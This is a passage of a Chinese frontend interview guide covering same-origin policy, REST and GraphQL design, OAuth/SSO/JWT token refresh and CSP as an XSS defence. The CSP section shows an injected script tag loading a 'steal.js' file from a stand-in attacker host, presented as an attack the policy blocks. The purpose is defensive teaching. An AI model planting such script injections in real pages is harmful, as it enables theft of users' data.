> 完全不同。**TCP keepalive** 是 TCP 协议层的保活机制（发送探测包），防止空闲连接被防火墙清除，由操作系统管理（`tcp_keepalive_time`）；**HTTP Keep-Alive** 是应用层（HTTP/1.1）的持久连接控制，告知双方在完成请求后不要立即关闭 TCP 连接。两者可以同时启用。

### Q: 浏览器同源策略详解？哪些资源受限，哪些不受限？

**难度**：⭐⭐⭐ | **频率**：🔥🔥🔥🔥

**答：**

同源策略（Same-Origin Policy）是浏览器的核心安全机制，**同源 = 协议 + 域名 + 端口三者完全相同**。

**受同源策略限制的操作：**
```
1. JS 读取跨域 DOM（如 iframe）
   // 同源 iframe 可以操作
   const doc = iframe.contentDocument; // ✅ 同源
   
   // 跨域 iframe 无法读取
   const doc = crossOriginIframe.contentDocument; // ❌ 报错

2. 跨域 AJAX / Fetch 请求
   fetch('https://other-domain.com/api'); // ❌ 被 CORS 拦截

3. 跨域读取 Cookie、localStorage
   // a.com 无法读取 b.com 设置的 Cookie
   // 即使是同一个人开发的网站
```

**不受同源策略限制的（可跨域）：**
```
// 以下标签可以跨域加载资源（但 JS 无法读取内容）
<img src="https://cdn.other.com/img.png">          ✅ 可展示
<script src="https://cdn.other.com/lib.js">        ✅ 可执行
<link href="https://cdn.other.com/style.css">      ✅ 可应用
<video src="https://cdn.other.com/video.mp4">      ✅ 可播放
<iframe src="https://other.com">                   ✅ 可展示（不能读取 DOM）
<form action="https://other.com/submit">           ✅ 可提交（这是 CSRF 的根源）
```

**跨域资源共享的几种方式：**
```
1. CORS（推荐）：后端设置响应头
2. postMessage：跨窗口/iframe 安全通信
3. document.domain：同一主域下子域互访（已弃用）
4. JSONP（仅 GET）：利用 <script> 跨域特性
5. 反向代理：服务端同源请求转发
```

```js
// postMessage 跨域 iframe 通信
// 父页面
const iframe = document.getElementById('myIframe');
iframe.contentWindow.postMessage(
  { type: 'data', payload: 'hello' },
  'https://trusted-domain.com'  // 目标源，必须指定
);

// iframe 页面接收
window.addEventListener('message', (event) => {
  // 必须验证来源！
  if (event.origin !== 'https://parent-domain.com') return;
  console.log('收到消息:', event.data);
  // 回复
  event.source.postMessage({ type: 'reply', data: 'received' }, event.origin);
});
```

---

**🔍 深层原理**

**同源策略的历史背景与设计哲学：**

1995 年 Netscape 引入。核心假设：同一来源（网站）的脚本是互相信任的，不同来源是互相不信任的。如果没有同源策略，任何网站的 JS 都能读取你银行网站的 DOM 和 Cookie，后果不堪设想。

**为什么 `<script>` 标签可以跨域但 fetch 不行？**

历史遗留：`<script>` 标签在同源策略出现之前就已经跨域加载（CDN 模式），不能突然禁止（会破坏大量已有网站）。而 XMLHttpRequest/fetch 是后来加入的，从设计之初就遵守同源策略。这也是 JSONP 能工作的原因——利用 `<script>` 的豁免。

**CORS 是同源策略的"开洞"机制：**

服务器通过 `Access-Control-Allow-Origin` 明确表态："我允许这些来源的 JS 访问我的响应数据"，相当于在同源策略上打了一个受控的洞。

---

**⚠️ 常见误区**

1. ❌ **同源策略阻止了请求发出**：同源策略不阻止请求发出（请求到达服务器），而是阻止 JS **读取**跨域响应。服务器日志中能看到跨域请求。
2. ❌ **设置 CORS 头就能让 JS 读取 Canvas 中跨域图片**：Canvas 中渲染跨域图片（没有设置 crossorigin 属性）后，Canvas 变为"污染"状态，`toDataURL()` 会报错。需要图片服务器设置 CORS 头，且 `<img>` 标签加 `crossorigin="anonymous"`。
3. ✅ **同源策略是浏览器行为**：Node.js 服务端代码没有同源策略限制，可以自由请求任意 URL。

---

**💡 踩坑点**

- iframe 嵌入第三方页面需要考虑 `X-Frame-Options: DENY/SAMEORIGIN`，该响应头控制页面是否允许被嵌入 iframe
- Canvas 跨域图片：`img.crossOrigin = 'anonymous'` 必须在设置 `src` 之前
- `postMessage` 一定要验证 `event.origin`，否则任何页面都能伪造消息

---

**🎯 面试追问**

**Q1：父子 iframe 同源时，有哪些交互能力？跨域时呢？**

> 同源：可以互相访问 DOM、读取 localStorage（同源则共享存储）、操作 `window` 对象；跨域：只能用 `postMessage` 通信，无法访问彼此 DOM/Cookie/localStorage。

**Q2：`a.example.com` 和 `b.example.com` 如何实现跨子域通信？**

> 两个页面同时设置 `document.domain = 'example.com'`，可以互相访问 DOM（老方法，已被弃用）；更好的现代方案是用 `postMessage`；或将公共数据放在主域的 API 上，两个子域都通过 CORS 访问。

**Q3：SharedWorker 或 BroadcastChannel 是否受同源策略约束？**

> 是的，SharedWorker 和 BroadcastChannel 都只在**同源**页面间有效，无法跨域通信。跨域通信只能用 `postMessage`（通过 window/iframe/worker 的引用）或 WebSocket 等服务端中转方案。

---

### Q: RESTful API 设计规范？

**难度**：⭐⭐⭐ | **频率**：🔥🔥🔥

**答：**

REST（Representational State Transfer）是一种 API 设计风格，核心原则：**以资源为中心，用 HTTP 方法表达动作，用状态码表达结果**。

**URL 设计：**
```
# ✅ RESTful：名词复数，层级清晰
GET    /users              # 获取用户列表
GET    /users/123          # 获取单个用户
POST   /users              # 创建用户
PUT    /users/123          # 全量更新用户
PATCH  /users/123          # 部分更新用户
DELETE /users/123          # 删除用户

GET    /users/123/orders   # 获取用户的订单
GET    /users/123/orders/456  # 获取用户的某个订单

# ❌ 非 RESTful：动词在 URL 里
POST /getUser
POST /createUser
POST /deleteUser
GET  /user_list
```

**HTTP 方法语义与幂等性：**
```
GET    → 只读，幂等，可缓存，无副作用
POST   → 创建，非幂等（多次调用创建多条）
PUT    → 全量替换，幂等（多次结果相同）
PATCH  → 部分更新，通常幂等
DELETE → 删除，幂等（删除不存在的返回 404 或 204）
HEAD   → 只要响应头，不要 body（用于检查资源是否存在/大小）
OPTIONS → 获取服务器支持的方法（CORS 预检）
```

**响应格式规范：**
```json
// 列表响应（带分页）
{
  "data": [
    { "id": 1, "name": "Alice" },
    { "id": 2, "name": "Bob" }
  ],
  "pagination": {
    "page": 1,
    "pageSize": 10,
    "total": 100
  }
}

// 错误响应
{
  "error": {
    "code": "VALIDATION_ERROR",
    "message": "邮箱格式不正确",
    "details": [
      { "field": "email", "message": "Invalid email format" }
    ]
  }
}
```

---

**🔍 深层原理**

**Richardson 成熟度模型（REST 分级）：**
```
Level 0 - 一个 URL，全 POST（RPC 风格）
Level 1 - 多个资源 URL
Level 2 - 使用 HTTP 方法（GET/POST/DELETE 等）← 大多数 "REST API" 在这里
Level 3 - HATEOAS（超媒体驱动，响应包含下一步操作的链接）← 真正的 REST
```

**HATEOAS 示例（Level 3）：**
```json
// GET /users/123 响应
{
  "id": 123,
  "name": "Alice",
  "_links": {
    "self": { "href": "/users/123" },
    "orders": { "href": "/users/123/orders" },
    "update": { "href": "/users/123", "method": "PUT" },
    "delete": { "href": "/users/123", "method": "DELETE" }
  }
}
// 客户端不需要硬编码 URL，通过响应中的链接导航
```

**版本控制策略：**
```
// 方案 1：URL 版本号（最常用）
GET /api/v1/users
GET /api/v2/users

// 方案 2：请求头版本
GET /api/users
Accept: application/vnd.myapi.v2+json

// 方案 3：查询参数
GET /api/users?version=2
```

---

**⚠️ 常见误区**

1. ❌ **REST = JSON + HTTP**：REST 是架构风格，不限定数据格式，但 JSON 是事实标准。
2. ❌ **PUT 和 PATCH 可以混用**：PUT 是**全量替换**（未传的字段会被清空），PATCH 是**部分更新**（只更新传入的字段），语义不同，不能随意互换。
3. ❌ **REST API 不用 POST 做查询**：复杂查询（条件多、参数长）可以用 POST（请求体传条件），但 GET + 查询参数是标准做法。GraphQL 解决了这个痛点。
4. ✅ **RESTful 不是强制标准**：它是设计风格，不是协议。团队一致性比教条式遵循更重要。

---

**💡 踩坑点**

- DELETE 成功应该返回 204（无内容）还是 200（有内容）？团队统一即可，但 204 更 REST 语义
- PATCH 的请求体格式不统一：可以直接发差量 JSON，也可以用 JSON Patch（RFC 6902）格式（`[{"op":"replace","path":"/name","value":"Alice"}]`），项目中保持一致
- 分页参数命名：`page`/`size`、`page`/`per_page`、`offset`/`limit` 三种流派，用一种就好，并在文档中标注

---

**🎯 面试追问**

**Q1：REST API 如何处理批量操作？**

> REST 没有原生批量操作语义。常见方案：`POST /users/batch`（自定义批量端点）、`DELETE /users?ids=1,2,3`（查询参数传多个 ID）、或使用 GraphQL Mutation 一次性操作多个资源。

**Q2：如何设计 REST API 的权限控制？**

> 依赖 HTTP 状态码（401 未认证、403 无权限），结合 JWT/OAuth 鉴权中间件。细粒度权限（如只能看自己的订单）在业务逻辑层过滤，`GET /users/123/orders` 中间件验证当前用户是否是 ID 123 的用户。

**Q3：GET 请求能有 Body 吗？**

> HTTP 规范不禁止 GET 有 body，但大多数服务器/代理/框架会忽略它。Elasticsearch 的 `_search` API 就用 GET + Body（有争议）。实践中建议 GET 查询放 URL 参数，复杂查询改用 POST 或 GraphQL。

### Q: GraphQL vs REST 的对比？各自适用什么场景？

**难度**：⭐⭐⭐ | **频率**：🔥🔥🔥

**答：**

**核心对比：**

| 维度 | REST | GraphQL |
|---|---|---|
| 数据获取 | 固定响应结构 | 客户端按需指定字段 |
| 请求数量 | 多资源多次请求 | 单次请求多资源 |
| 过度获取 | 经常（多余字段） | 不会（精确指定） |
| 获取不足 | 经常（需多次请求） | 不会（一次查询关联数据）|
| 强类型 | 无（靠文档约定） | 有（Schema 定义）|
| 版本管理 | 需要 v1/v2 等版本 | Schema 演进，不需要版本 |
| 缓存 | HTTP 缓存天然支持 | 需要额外处理（Apollo Client）|
| 调试工具 | 通用（curl/Postman）| GraphQL Playground / Introspection |
| 学习成本 | 低 | 高 |

**GraphQL 核心概念：**
```graphql
# Schema 定义
type User {
  id: ID!
  name: String!
  email: String!
  orders: [Order!]!
}

type Order {
  id: ID!
  amount: Float!
  status: String!
}

type Query {
  user(id: ID!): User
  users: [User!]!
}

type Mutation {
  createUser(name: String!, email: String!): User!
  updateUser(id: ID!, name: String): User!
}

type Subscription {
  orderStatusChanged(orderId: ID!): Order!
}
```

```js
// REST：获取用户+订单需要 2 次请求
// GET /users/123       → 用户信息
// GET /users/123/orders → 订单列表

// GraphQL：1 次请求获取所有需要的数据
const query = `
  query GetUserWithOrders($id: ID!) {
    user(id: $id) {
      name
      email
      orders {
        id
        amount
        status
      }
    }
  }
`;

// 前端调用（Apollo Client）
import { useQuery, gql } from '@apollo/client';

const GET_USER = gql`
  query GetUser($id: ID!) {
    user(id: $id) {
      name
      email
    }
  }
`;

function UserProfile({ userId }) {
  const { data, loading, error } = useQuery(GET_USER, {
    variables: { id: userId }
  });
  if (loading) return <Spinner />;
  if (error) return <Error />;
  return <div>{data.user.name}</div>;
}
```

---

**🔍 深层原理**

**N+1 问题（GraphQL 的经典坑）：**

```graphql
# 查询所有用户的订单
query {
  users {          # 1 次 SQL 查所有用户
    orders {       # N 次 SQL（每个用户查一次订单） → N+1 问题！
      amount
    }
  }
}
```

**解决方案：DataLoader（批处理 + 缓存）：**
```js
const DataLoader = require('dataloader');

// 把 N 次单个查询合并为 1 次批量查询
const orderLoader = new DataLoader(async (userIds) => {
  // 一次 SQL 查所有用户的订单
  const orders = await db.orders.findAll({ where: { userId: userIds } });
  return userIds.map(id => orders.filter(o => o.userId === id));
});

// Resolver 中使用
const resolvers = {
  User: {
    orders: (user) => orderLoader.load(user.id)  // 自动批处理
  }
};
```

**GraphQL 的缓存挑战：**

REST GET 请求 URL 不变 → HTTP 缓存天然有效；GraphQL 所有请求都是 POST 到同一个 `/graphql` 端点，HTTP 缓存失效。需要用 Apollo Client 的 Normalized Cache（按对象 ID 缓存到内存）或 Persisted Queries。

---

**⚠️ 常见误区**

1. ❌ **GraphQL 一定比 REST 好**：GraphQL 学习成本高，运维复杂（缓存、权限细粒度控制、N+1 问题），小项目过度设计。
2. ❌ **GraphQL 替代了 REST**：两者并存。微服务内部通信仍多用 REST，GraphQL 更适合作为 API 网关（BFF 层）聚合多个服务。
3. ✅ **GraphQL Subscription 用于实时推送**：基于 WebSocket，是 GraphQL 处理实时场景的解法。

---

**💡 踩坑点**

- GraphQL 权限控制比 REST 细粒度难做：字段级权限需要在每个 Resolver 中验证，推荐用 GraphQL Shield 中间件
- 生产环境关闭 Introspection（防止暴露 Schema 结构给攻击者）：`introspection: process.env.NODE_ENV !== 'production'`
- 文件上传在 GraphQL 中比较麻烦（multipart 规范），有时候直接用独立的 REST 接口做文件上传更简单

---

**🎯 面试追问**

**Q1：什么场景下你会选择 GraphQL 而不是 REST？**

> 多端（Web/iOS/Android）数据需求差异大（避免为不同端维护多个接口）；需要灵活查询关联数据（避免 N+1 的额外请求）；前端团队强，后端 API 变化频繁（Schema 驱动开发）。简单 CRUD 或团队 GraphQL 经验不足时，REST 更合适。

**Q2：GraphQL 如何做接口版本管理？**

> GraphQL 推荐通过 Schema 演进（向后兼容）代替版本管理：添加新字段（不破坏旧客户端）、用 `@deprecated` 标记废弃字段（给客户端迁移时间）。实在需要破坏性变更时，才考虑 Schema Stitching 维护多版本。

**Q3：Apollo Client 的 Normalized Cache 是什么原理？**

> Apollo Client 把所有查询结果按类型+ID（如 `User:123`）规范化存入内存 store。不同查询中相同对象会合并成一份，自动去重。任何地方更新了 `User:123` 的字段，所有订阅了该用户数据的组件自动更新，无需手动管理状态。

### Q: 前端鉴权方案详解：OAuth 2.0 / SSO / JWT 无感刷新？

**难度**：⭐⭐⭐⭐ | **频率**：🔥🔥🔥🔥

**答：**

**OAuth 2.0（第三方授权）：**
```
// 授权码模式（最安全，适合有后端的 Web 应用）
用户 → 点击"微信登录"
    → 跳转 https://open.weixin.qq.com/oauth2/authorize?client_id=xxx&redirect_uri=xxx&response_type=code
    → 微信显示授权页面，用户确认
    → 微信重定向回 https://myapp.com/callback?code=AUTHORIZATION_CODE
    → 后端用 code 换 access_token（code 只能用一次，后端请求不暴露 secret）
    → 用 access_token 请求微信用户信息
    → 在自己的系统中创建/登录用户，返回自己的 JWT

// 隐式模式（不推荐，access_token 暴露在 URL）
// PKCE 模式（适合无后端 SPA / 移动 App，是授权码的安全升级版）
```

**SSO（Single Sign-On，单点登录）：**
```
// 基于 CAS 协议的 SSO 流程
用户 → 访问 app1.company.com（未登录）
    → 被重定向到 sso.company.com/login?service=app1.company.com
    → 在 SSO 中心登录，SSO 生成 Ticket
    → 重定向回 app1.company.com?ticket=TGT-123
    → app1 后端向 SSO 验证 ticket：GET sso.company.com/validate?ticket=TGT-123
    → SSO 确认有效，返回用户信息
    → app1 创建本地 session，用户登录成功

    用户再访问 app2.company.com：
    → 重定向 SSO，SSO 发现有有效 TGT Cookie
    → 直接发 Ticket 给 app2，无需再次登录
```

**JWT 无感刷新（双 Token 机制）：**
```js
// access_token: 15 分钟过期，用于鉴权
// refresh_token: 7 天过期，用于刷新 access_token

let isRefreshing = false;
let pendingRequests = [];  // 等待刷新的请求队列

axios.interceptors.response.use(
  response => response,
  async (error) => {
    const { config, response } = error;
    
    // access_token 过期（401），且不是 refresh 请求本身
    if (response?.status === 401 && !config._retry) {
      config._retry = true;
      
      if (!isRefreshing) {
        isRefreshing = true;
        try {
          // 用 refresh_token 换新的 access_token
          const { data } = await axios.post('/auth/refresh', {}, {
            withCredentials: true  // 带上 refresh_token cookie
          });
          
          const newToken = data.accessToken;
          localStorage.setItem('token', newToken);
          
          // 重放所有等待中的请求
          pendingRequests.forEach(cb => cb(newToken));
          pendingRequests = [];
          isRefreshing = false;
          
          // 重放当前失败的请求
          config.headers.Authorization = `Bearer ${newToken}`;
          return axios(config);
        } catch (refreshError) {
          // refresh_token 也过期了，强制登出
          isRefreshing = false;
          pendingRequests = [];
          localStorage.removeItem('token');
          router.push('/login');
          return Promise.reject(refreshError);
        }
      } else {
        // 已在刷新中，排队等待
        return new Promise(resolve => {
          pendingRequests.push((newToken) => {
            config.headers.Authorization = `Bearer ${newToken}`;
            resolve(axios(config));
          });
        });
      }
    }
    
    return Promise.reject(error);
  }
);
```

---

**🔍 深层原理**

**OAuth 2.0 的四种授权模式：**
```
1. 授权码模式（Authorization Code）：有后端，最安全
2. PKCE 模式（Proof Key for Code Exchange）：SPA/移动 App，代替隐式模式
3. 客户端凭证模式（Client Credentials）：服务间通信，无用户参与
4. 设备码模式（Device Code）：智能电视/IoT 设备，无浏览器
```

**OIDC（OpenID Connect）= OAuth 2.0 + 身份层：**

OAuth 2.0 本身只做"授权"（你被允许读我的照片），不做"认证"（你是谁）。OIDC 在 OAuth 2.0 之上增加 `id_token`（JWT 格式，包含用户身份信息），使其同时具备认证能力。

---

**⚠️ 常见误区**

1. ❌ **OAuth = 登录**：OAuth 是**授权协议**，不是认证协议。"用微信登录"的背后是 OIDC（OAuth + 身份层）而不是纯 OAuth。
2. ❌ **JWT 刷新只要前端做就够了**：refresh_token 必须存 HttpOnly Cookie（后端控制），access_token 可以存内存或 localStorage，后端要有 refresh_token 的轮换和失效机制。
3. ✅ **SSO 退出需要通知所有子系统**：单点退出（SLO）比单点登录复杂，需要 SSO 中心通知所有已创建 session 的子系统清除 session。

---

**💡 踩坑点**

- OAuth 回调 URL 必须在第三方平台白名单中，本地开发需单独配置（如 `http://localhost:3000/callback`）
- access_token 存内存（而非 localStorage）在页面刷新后丢失，需要刷新时用 refresh_token 静默换新（页面加载时自动 refresh）
- JWT 无感刷新的并发问题：多个请求同时 401 时只能发一次 refresh，其他请求要排队等待，不能并发刷新（会导致多次刷新、旧 refresh_token 被废弃）

---

**🎯 面试追问**

**Q1：PKCE 解决了什么问题？**

> 隐式模式（Implicit Flow）中 access_token 直接在 URL Fragment 中返回，可能被日志、Referer 头泄露。PKCE 通过在授权请求时发送 `code_challenge`（随机值的 hash），换 token 时发送 `code_verifier`（原始随机值），服务器验证两者匹配，确保只有发起授权请求的应用才能换到 token，即使 code 泄露也无法滥用。

**Q2：如何防止 refresh_token 被盗用？**

> Refresh Token Rotation：每次用 refresh_token 换 access_token 时，同时颁发新的 refresh_token，旧 refresh_token 立即失效。如果发现旧 refresh_token 被重复使用（说明有人盗用），立即吊销该用户的所有 token，强制重新登录。

**Q3：企业内网 SSO 和互联网第三方登录（OAuth）有什么区别？**

> 企业 SSO（CAS/SAML）更注重**组织内多系统互通**（员工登一次就能用所有内部系统）；OAuth 更注重**第三方授权**（允许第三方应用代表用户访问资源）。OIDC 是现代协议，统一了两者的使用场景，企业 SSO 也越来越多地采用 OIDC。

---

### Q: CSP（内容安全策略）详解？如何防御 XSS？

**难度**：⭐⭐⭐ | **频率**：🔥🔥🔥

**答：**

CSP（Content Security Policy）是浏览器安全机制，通过声明白名单限制页面可以加载和执行的资源，是防御 XSS 的重要纵深防御手段。

**配置方式：**
```
// 方式 1：HTTP 响应头（推荐）
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.trusted.com; style-src 'self' 'unsafe-inline'

// 方式 2：HTML meta 标签（不能用于 frame-ancestors 等指令）
<meta http-equiv="Content-Security-Policy" content="default-src 'self'">
```

**常用 CSP 指令：**
```
default-src   → 所有类型的默认来源
script-src    → JavaScript 来源
style-src     → CSS 来源
img-src       → 图片来源
font-src      → 字体来源
connect-src   → fetch/XHR/WebSocket 等连接
frame-src     → iframe 来源
frame-ancestors → 谁可以嵌入本页面（替代 X-Frame-Options）
report-uri    → 违规上报 URL（已弃用，用 report-to）
report-to     → 违规上报端点
```

**常用源值：**
```
'self'          → 同源
'none'          → 禁止所有
'unsafe-inline' → 允许内联（❌ 会削弱 CSP，尽量避免）
'unsafe-eval'   → 允许 eval()（❌ 高危，避免）
'nonce-{随机值}' → 允许特定内联脚本（✅ 推荐替代 unsafe-inline）
'strict-dynamic'→ 允许被信任脚本动态加载的脚本
https:          → 允许所有 HTTPS 来源
data:           → 允许 data: URI
```

**典型 CSP 配置示例：**
```
# 严格模式（推荐）
Content-Security-Policy:
  default-src 'none';
  script-src 'self' 'nonce-{random}';    // nonce 每次响应随机生成
  style-src 'self' 'nonce-{random}';
  img-src 'self' data: https://cdn.example.com;
  font-src 'self' https://fonts.gstatic.com;
  connect-src 'self' https://api.example.com wss://ws.example.com;
  frame-ancestors 'none';                // 禁止被任何页面 iframe 嵌入
  base-uri 'self';                       // 防止 base 标签注入
  form-action 'self';                    // 表单只能提交到同源

# 上线报告模式（先监控，不阻断）
Content-Security-Policy-Report-Only:
  default-src 'self';
  report-to /csp-violations
```

```js
// Node.js 动态生成 nonce（每次请求不同）
const crypto = require('crypto');

app.use((req, res, next) => {
  const nonce = crypto.randomBytes(16).toString('base64');
  res.locals.nonce = nonce;
  res.setHeader(
    'Content-Security-Policy',
    `script-src 'self' 'nonce-${nonce}';`
  );
  next();
});

// HTML 模板中使用 nonce
// <script nonce="<%= nonce %>">
//   // 这个内联脚本被允许执行
// </script>
// <script nonce="wrongValue">
//   // 这个会被 CSP 阻止！
// </script>
```

---

**🔍 深层原理**

**CSP 如何防御 XSS？**

即使攻击者成功注入了 `<script>alert(1)</script>`，CSP 会：
- 检查脚本来源（不在白名单 → 拒绝执行）
- 检查内联脚本 nonce（没有正确 nonce → 拒绝执行）
- 阻止 `eval()`、`innerHTML` 中的动态脚本

```
攻击者注入：<script src="http://evil.com/steal.js"></script>
CSP 规则：  script-src 'self'
结果：      浏览器阻止加载 evil.com 的脚本，攻击失败
```

**CSP Level 3 的 strict-dynamic：**

`'strict-dynamic'` 允许受信任脚本（带 nonce/hash）动态创建的 `<script>` 元素执行，无需将 CDN 地址加白名单，适合现代前端框架（动态加载 chunk）：
```
script-src 'nonce-xxx' 'strict-dynamic'
```

---

**⚠️ 常见误区**

1. ❌ **CSP 可以替代输入过滤**：CSP 是防御纵深，不是银弹。攻击者仍可以注入 HTML（钓鱼、页面破坏），CSP 只阻止脚本执行。输入过滤 + 输出转义 + CSP 才是完整防护。
2. ❌ **`unsafe-inline` 加了也没关系**：`unsafe-inline` 使 CSP 对 XSS 的防护效果大幅降低，相当于开了后门。应该用 nonce 替代。
3. ✅ **Report-Only 模式可以先监控再上线**：`Content-Security-Policy-Report-Only` 只上报违规不阻断，可以在不影响用户的情况下测试 CSP 策略。

---

**💡 踩坑点**

- SPA（如 React/Vue）内联 style 很常见（CSS-in-JS），限制 style-src 可能需要 `'unsafe-inline'` 或 nonce，前端框架对 CSP 的支持程度不一
- 第三方 SDK（如 Google Analytics、Sentry）会动态注入脚本，需要把它们的域名加入白名单
- 用 `Content-Security-Policy-Report-Only` 收集一段时间违规数据，了解有哪些合法来源，再制定正式的 CSP 策略

**🎯 面试追问**

**Q1：CSP 的 nonce 机制是怎么工作的？为什么要每次请求随机生成？**

> 服务器为每次 HTTP 响应生成唯一随机 nonce，同时写入 CSP 头和 HTML 中合法内联脚本的属性。浏览器只执行 nonce 匹配的内联脚本。如果攻击者注入了 `<script>`，没有正确 nonce，浏览器拒绝执行。nonce 每次随机是防止攻击者复用历史 nonce。

**Q2：frame-ancestors 和 X-Frame-Options 有什么区别？**

> 功能相似（控制谁可以在 iframe 中嵌入本页面），但 `frame-ancestors` 是 CSP 指令，更灵活（支持多个来源、通配符）；`X-Frame-Options` 是老标准（只支持 DENY/SAMEORIGIN/ALLOW-FROM 一个值）。CSP 的 `frame-ancestors` 优先级更高，是推荐的现代做法。

**Q3：如何为 React 应用配置 CSP？**

> React 脚手架（Webpack/Vite）打包后的静态 JS 文件可以通过 `script-src 'self'` 直接引用。但 `styled-components`、`emotion` 等 CSS-in-JS 库会在运行时插入 `<style>` 标签，需要配置 `style-src 'unsafe-inline'` 或使用 nonce 插件（`@emotion/cache` 支持 nonce）。React 18 的 streaming SSR 需要注意 nonce 的透传。
